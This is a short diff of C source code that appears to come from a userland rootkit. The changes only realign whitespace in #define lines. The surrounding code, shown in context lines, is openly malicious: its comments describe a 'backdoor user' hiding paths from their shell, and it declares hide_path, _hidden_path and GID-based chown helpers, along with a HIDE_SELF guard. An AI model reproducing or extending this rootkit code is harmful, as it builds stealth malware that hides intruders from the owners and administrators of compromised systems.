@@ -16,7 +16,7 @@ gid_t get_fd_gid64(int fd);
 #include "get_path_gid.c"
 
 #define MODE_REG 0x32  /* STAT MODE FOR REGULAR FILES. */
-#define MODE_64 0x64   /* STAT MODE FOR BIG FILES. */
+#define MODE_64  0x64  /* STAT MODE FOR BIG FILES. */
 
 int _hidden_path(const char *pathname, int mode);
 int _f_hidden_path(int fd, int mode);
@@ -36,9 +36,9 @@ int chown_path(char *path, gid_t gid){
     return (long)call(CCHOWN, path, 0, gid);
 }
 
-#define PATH_ERR -1  /* error codes for when the backdoor */
-#define PATH_DONE 1  /* user is trying to hide paths from */
-#define PATH_SUCC 0  /* their shell. */
+#define PATH_ERR   -1  /* error codes for when the backdoor */
+#define PATH_DONE   1  /* user is trying to hide paths from */
+#define PATH_SUCC   0  /* their shell. */
 
 int hide_path(char *path){
 #ifndef HIDE_SELF
